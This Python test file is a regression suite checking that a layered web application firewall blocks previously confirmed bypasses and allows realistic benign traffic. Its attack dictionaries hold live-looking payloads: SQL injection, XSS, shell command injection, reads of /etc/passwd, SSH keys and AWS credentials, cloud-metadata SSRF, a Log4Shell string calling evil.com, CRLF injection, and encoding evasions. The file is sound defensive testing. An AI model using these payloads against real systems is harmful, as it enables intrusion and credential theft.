"""
Regression suite for the WAF bypasses closed during the red-team remediation.

Each case here corresponds to a CONFIRMED bypass that was fixed; the tests assert the
attack is now stopped and that realistic benign traffic is NOT (false positives are their
own denial of service). It also guards against the ReDoS that let a 4 KB request burn a
CPU core for ~2 minutes.

Runs against the REAL enforcement path `waf.engine.LayeredWAF.evaluate()` in rules-only
mode — which is also the default production posture (ML is shadow/high-precision). No ML
dependencies required, so it runs anywhere.

Usage:
    pytest tests/test_waf_bypass_regression.py
    python  tests/test_waf_bypass_regression.py        # standalone scorecard
"""
import os
import sys
import time
import base64

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from waf.engine import LayeredWAF

# ml_enforce=False keeps this deterministic and ML-independent (the enforcing surface under
# test is the L1-L3 signature/heuristic tier, which is what these bypasses targeted).
_WAF = LayeredWAF(ml_enforce=False)

_IP = [0]


def _fresh_ip():
    # A unique client IP per request: the ML_PROBING heuristic accumulates per-IP state, so
    # reusing one IP across cases would create spurious blocks. Each case is a clean
    # single-shot attacker.
    _IP[0] += 1
    return "198.51.%d.%d" % (_IP[0] // 256 % 256, _IP[0] % 256)


def _decide(method="GET", path="/", query="", body="", headers=None):
    headers = headers or {"user-agent": "Mozilla/5.0"}
    return _WAF.evaluate(method, path, query, body, headers, _fresh_ip())


def _blocked(**kw):
    return _decide(**kw).action != "ALLOW"


def _allowed(**kw):
    return _decide(**kw).action == "ALLOW"


_B64_SQLI = base64.b64encode(b"'; DROP TABLE users; --").decode()
_VARIED_PAD = "lorem ipsum dolor sit amet consectetur adipiscing elit " * 1600  # ~86 KB, no run

# ── attacks that MUST be blocked (each was a confirmed bypass) ─────────────────────────────
ATTACKS = {
    # H1 truncation: attack tail past the inspection cap must not slip through
    "h1_truncation_sqli": dict(method="POST", body="x=" + _VARIED_PAD + "' OR '1'='1"),
    "h1_oversized_failclosed": dict(method="POST", body="x=" + ("varied text " * 30000)),  # >256KB -> fail closed
    # H2 fail-open: a lone surrogate used to crash the scanner and disable the whole tier
    "h2_surrogate_sqli": dict(query="q=\ud800 UNION SELECT username,password FROM users"),
    "h2_surrogate_rce": dict(method="POST", body="q=\ud800 ;cat /etc/passwd"),
    "h2_surrogate_mid_xss": dict(query="q=<scr\ud800ipt>alert(1)</script>"),
    # M2 header injection blind spot
    "m2_referer_sqli": dict(headers={"user-agent": "x", "referer": "http://h/?id=1' OR '1'='1"}),
    "m2_xff_sqli": dict(headers={"user-agent": "x", "x-forwarded-for": "1' OR '1'='1"}),
    "m2_authz_sqli": dict(headers={"user-agent": "x", "authorization": "Bearer ' OR 1=1-- -"}),
    "m2_origin_xss": dict(headers={"user-agent": "x", "origin": "<script>alert(1)</script>"}),
    "m2_cookie_sqli": dict(headers={"user-agent": "x", "cookie": "sid=1' OR '1'='1"}),
    "m2_xreq_rce": dict(headers={"user-agent": "x", "x-request-id": ";cat /etc/passwd"}),
    # M3 base64-wrapped payload
    "m3_base64_sqli": dict(method="POST", body="data=" + _B64_SQLI),
    # M4 form/JSON body
    "m4_formbody_rce": dict(method="POST", path="/run", body="cmd=whoami"),
    "m4_formbody_sqli": dict(method="POST", body="user=admin&pass=' OR '1'='1"),
    # baseline attacks that must always block
    "base_sqli": dict(query="id=1' OR '1'='1"),
    "base_xss": dict(query="q=<img src=x onerror=alert(1)>"),
    "base_rce": dict(method="POST", body="cmd=;cat /etc/passwd"),
    "base_lfi": dict(query="file=%2e%2e%2fetc%2fpasswd"),
    "base_ssrf": dict(query="url=http://169.254.169.254/latest/meta-data/"),
    "base_ssti": dict(query="name={{7*7}}"),
    "base_log4shell": dict(query="x=${jndi:ldap://evil.com/a}"),
    "scheme_relative_redirect": dict(query="next=//evil.com/phish"),
    # found by the red-team campaign: SSRF via octal-encoded IP (0177.0.0.1 == 127.0.0.1)
    "ssrf_octal_ip": dict(query="url=http://0177.0.0.1/admin"),
    "redirect_backslash": dict(query="next=/\\evil.com"),
    "redirect_js_scheme": dict(query="next=javascript:alert(document.cookie)"),
}

# ── realistic benign traffic that MUST be allowed (no false positives) ─────────────────────
BENIGN = {
    "home": dict(query="q=hello world"),
    "search": dict(query="q=running shoes size 10&sort=price"),
    "json_login": dict(method="POST", path="/login", body='{"user":"alice","pass":"s3cret!"}'),
    "json_nested": dict(method="POST", body='{"items":[{"id":1,"tags":["a","b"]}],"total":2}'),
    "form_comment": dict(method="POST", body="comment=Great product, will buy again"),
    "graphql": dict(method="POST", path="/graphql", body='{"query":"{ user(id:5){ name email } }"}'),
    "markdown": dict(method="POST", body="content=# Title\n\n**bold** and a [link](https://x.com)"),
    "normal_referer": dict(headers={"user-agent": "x", "referer": "https://example.com/search?q=shoes&page=2"}),
    "normal_origin": dict(headers={"user-agent": "x", "origin": "https://app.example.com"}),
    "normal_bearer": dict(headers={"user-agent": "x", "authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.ab"}),
    "cookie_session": dict(headers={"user-agent": "x", "cookie": "sessionid=abc123; theme=dark; lang=en-US"}),
    "xreq_uuid": dict(headers={"user-agent": "x", "x-request-id": "550e8400-e29b-41d4-a716-446655440000"}),
    "xff_real_ips": dict(headers={"user-agent": "x", "x-forwarded-for": "203.0.113.9, 70.41.3.18"}),
    "url_callback": dict(query="callback=https://myapp.com/oauth/return"),
    # legit absolute-URL redirects must NOT be blocked (the REDIR-001 false positive we fixed)
    "redirect_absolute": dict(query="next=https://myapp.com/dashboard"),
    "redirect_absolute_q": dict(query="return=https://app.example.com/home?tab=orders"),
    "filepath": dict(query="path=/home/user/documents/report.pdf"),
    "emoji": dict(method="POST", body="msg=Hello world café résumé \U0001f389"),
    "base64_avatar": dict(method="POST", body="avatar=" + base64.b64encode(b"\x89PNG\r\n\x1a\nfake image bytes padding").decode()),
    "large_150k": dict(method="POST", body="text=" + ("The quick brown fox jumps over the lazy dog. " * 3300)),
    # RCE-011 used a bare \b anchor, so a query/form PARAMETER named like a shell command
    # ("id=", "pwd=", "hostname=") false-positived as remote-code-execution. These are among
    # the most common parameter names on the web; the \b(?!\s*=) fix must keep them benign.
    "param_id": dict(query="id=12345"),
    "param_pwd": dict(method="POST", body="pwd=hunter2"),
    "param_hostname": dict(query="hostname=web-prod-01"),
    "param_id_midquery": dict(query="first=a&id=5&sort=name"),
    # A bare SQL verb is ordinary English — the "keyword\s+" rule blocked whole sentences.
    # Real SQLi needs statement structure (select..from, insert into, ...), asserted below.
    "verb_select": dict(query="q=please select your reunion date"),
    "verb_update": dict(method="POST", body="msg=update your profile settings"),
    "verb_delete": dict(method="POST", body="msg=delete this message when done"),
    "verb_create": dict(query="q=create an account to continue"),
    "verb_drop": dict(method="POST", body="msg=drop us a line anytime"),
    # "exec"/"execute" as plain English must NOT be flagged (only DBA-token exec is SQLi).
    "verb_execute_prose": dict(query="q=execute the marketing plan this quarter"),
    "verb_exec_summary": dict(method="POST", body="msg=our executive summary is ready"),
    # Modern API traffic (JSON/GraphQL/OAuth/file paths). These shapes do not exist in the
    # CSIC/PKDD corpora, and each one below was a measured false positive against 4,000
    # generated modern requests (14.37% FP before these fixes, 0.00% after).
    "graphql_id_field": dict(method="POST", path="/graphql",
                             body='{"query":"{ user(id:42){ name email orders { id total } } }"}'),
    "json_id_key": dict(method="POST", path="/api", body='{"id":7,"total":42}'),
    "prose_pwd": dict(method="POST", body="msg=please enter your pwd here"),
    "oauth_callback": dict(path="/oauth/callback", query="code=d3fd05dcb0974885&state=42446"),
    "filepath_home": dict(path="/files", query="path=/home/user/docs/report_2024.pdf"),
    "filepath_var_www": dict(path="/files", query="file=/var/www/uploads/report.pdf"),
    "filepath_usr_share": dict(path="/files", query="p=/usr/share/doc/readme.txt"),
    # Quote-split detection must not FP on benign intra-word apostrophes/quotes.
    "apostrophe_id": dict(method="POST", body="msg=I'd like to help you today"),
    "name_obrien": dict(query="name=O'Brien"),
    "contraction_dont": dict(method="POST", body="note=don't forget the meeting"),
}

# Structured SQLi that MUST still be caught after tightening the bare-keyword rule.
ATTACKS.update({
    "sqli_select_from": dict(query="id=1 AND SELECT name FROM admin"),
    "sqli_insert_into": dict(method="POST", body="x=1'; INSERT INTO logs VALUES(1)--"),
    "sqli_union_fragmented": dict(query="q=1/**/UN/**/ION/**/SEL/**/ECT/**/1"),
    # Regression: tightening the bare-verb rule to structure-only opened a quote-less
    # MSSQL RCE vector. These DBA / dynamic-SQL execution shapes MUST stay blocked.
    "sqli_exec_xp_cmdshell": dict(query="id=1 EXEC xp_cmdshell 'whoami'"),
    "sqli_exec_sp_configure": dict(query="id=1 EXEC sp_configure"),
    "sqli_execute_proc": dict(query="id=1 EXECUTE sp_who"),
    "sqli_declare": dict(query="id=1; DECLARE @x int"),
    "sqli_injctx_delete": dict(query="id=1; DELETE logs"),
    # Quote-splitting evasion of shell commands (w'h'oami -> whoami) must be caught.
    "rce_quote_split": dict(method="POST", path="/run", body="c=w'h'oami"),
    "rce_quote_split_dq": dict(method="POST", path="/run", body='c=if"con"fig'),
    # CRLF-001 only allowlisted Set-Cookie|Location|Content-Type, so every other injected
    # header slipped through — Content-Length/Transfer-Encoding are response splitting and
    # request smuggling, X-Forwarded-For forges the client identity this WAF rate-limits on.
    "crlf_content_length": dict(query="q=%0d%0aContent-Length:%200"),
    "crlf_transfer_encoding": dict(query="q=%0d%0aTransfer-Encoding:%20chunked"),
    "crlf_xff_spoof": dict(query="q=%0d%0aX-Forwarded-For:%201.2.3.4"),
    "crlf_arbitrary_header": dict(query="u=test%0d%0aX-Injected:%20true"),
    "crlf_log_forging": dict(query="u=test%0aFAKE%20LOG%20ENTRY"),
    # Narrowing the ambiguous "id"/"pwd" command tokens and the over-broad "/home/|/usr/"
    # LFI rule must not cost real detection. Chained shell invocation still blocks, and
    # non-traversal reads of sensitive targets now block (the old rules missed id_rsa).
    "rce_chained_id": dict(query="cmd=1;id"),
    "rce_subshell_id": dict(method="POST", path="/run", body="c=$(id)"),
    "rce_backtick_id": dict(method="POST", path="/run", body="c=`id`"),
    "rce_netstat": dict(query="x=1;netstat -an"),
    "lfi_etc_passwd_direct": dict(path="/files", query="f=/etc/passwd"),
    "lfi_proc_environ": dict(path="/files", query="f=/proc/self/environ"),
    "lfi_root_ssh_key": dict(path="/files", query="f=/root/.ssh/id_rsa"),
    "lfi_aws_credentials": dict(path="/files", query="f=/home/u/.aws/credentials"),
})


def _pytest_params(d):
    return list(d.items())


try:
    import pytest

    @pytest.mark.parametrize("name,kw", _pytest_params(ATTACKS))
    def test_attack_blocked(name, kw):
        assert _blocked(**kw), f"BYPASS regression: attack '{name}' was allowed"

    @pytest.mark.parametrize("name,kw", _pytest_params(BENIGN))
    def test_benign_allowed(name, kw):
        assert _allowed(**kw), f"FALSE POSITIVE regression: benign '{name}' was blocked"

    def test_no_redos():
        # A 4 KB unclosed template used to backtrack for ~2 minutes. It must resolve fast.
        payload = "{{" + (" " * 4096)
        t0 = time.perf_counter()
        _decide(method="POST", body="x=" + payload)
        elapsed = time.perf_counter() - t0
        assert elapsed < 1.0, f"ReDoS regression: scan took {elapsed:.1f}s (expected <1s)"

    def test_multiline_body_is_not_crlf_flagged():
        # The CRLF query rule must NOT extend to bodies: multi-line prose is ordinary there.
        assert _allowed(method="POST", path="/c", body="desc=Steps: do X\r\nNote: it fails")
        assert _allowed(method="POST", path="/c", body="comment=hi\r\nX-Something: value")

    def test_open_redirect_allowlist():
        # Arbitrary-host open redirect can only be decided against an allowlist of your own
        # hosts. Configured => foreign hosts blocked, own hosts allowed. Unset => check OFF.
        os.environ["WAF_ALLOWED_REDIRECT_HOSTS"] = "myapp.com"
        try:
            waf = LayeredWAF(ml_enforce=False)
        finally:
            os.environ.pop("WAF_ALLOWED_REDIRECT_HOSTS", None)
        hdr = {"user-agent": "x"}
        evil = waf.evaluate("GET", "/go", "next=https://evil.example.com/phish", "", hdr, "203.0.113.7")
        mine = waf.evaluate("GET", "/go", "next=https://myapp.com/dashboard", "", hdr, "203.0.113.8")
        rel = waf.evaluate("GET", "/go", "next=/dashboard", "", hdr, "203.0.113.9")
        assert evil.action != "ALLOW", "foreign redirect host must be blocked when allowlist is set"
        assert mine.action == "ALLOW", "own host must not be blocked"
        assert rel.action == "ALLOW", "relative redirect must not be blocked"

    def test_shadow_route_detects_but_does_not_block():
        # Content-type boundary: a route that legitimately carries SQL/code must DETECT
        # (shadow_would_block) but NOT 403, while the same payload elsewhere is blocked.
        os.environ["WAF_SHADOW_ROUTES"] = "/admin/query,/paste"
        try:
            waf = LayeredWAF(ml_enforce=False)
        finally:
            os.environ.pop("WAF_SHADOW_ROUTES", None)
        atk = "sql=1 UNION SELECT pass FROM admin--"
        exempt = waf.evaluate("GET", "/admin/query", atk, "", {"user-agent": "x"}, "203.0.113.1")
        enforced = waf.evaluate("GET", "/api/users", atk, "", {"user-agent": "x"}, "203.0.113.2")
        assert exempt.action == "ALLOW" and exempt.shadow_would_block, "shadow route must detect-not-block"
        assert enforced.action != "ALLOW", "non-exempt route must still enforce"
except ImportError:
    pass  # pytest not installed; use the standalone runner below


def _main():
    fails = []
    for name, kw in ATTACKS.items():
        if not _blocked(**kw):
            fails.append("ATTACK ALLOWED: " + name)
    for name, kw in BENIGN.items():
        if not _allowed(**kw):
            fails.append("BENIGN BLOCKED: " + name)
    payload = "{{" + (" " * 4096)
    t0 = time.perf_counter()
    _decide(method="POST", body="x=" + payload)
    redos = time.perf_counter() - t0
    if redos >= 1.0:
        fails.append("REDOS: %.1fs" % redos)
    print("attacks: %d | benign: %d | redos: %.4fs" % (len(ATTACKS), len(BENIGN), redos))
    if fails:
        print("FAIL (%d):" % len(fails))
        for f in fails:
            print("  " + f)
        return 1
    print("ALL PASS: %d attacks blocked, %d benign allowed, no ReDoS." % (len(ATTACKS), len(BENIGN)))
    return 0


if __name__ == "__main__":
    sys.exit(_main())
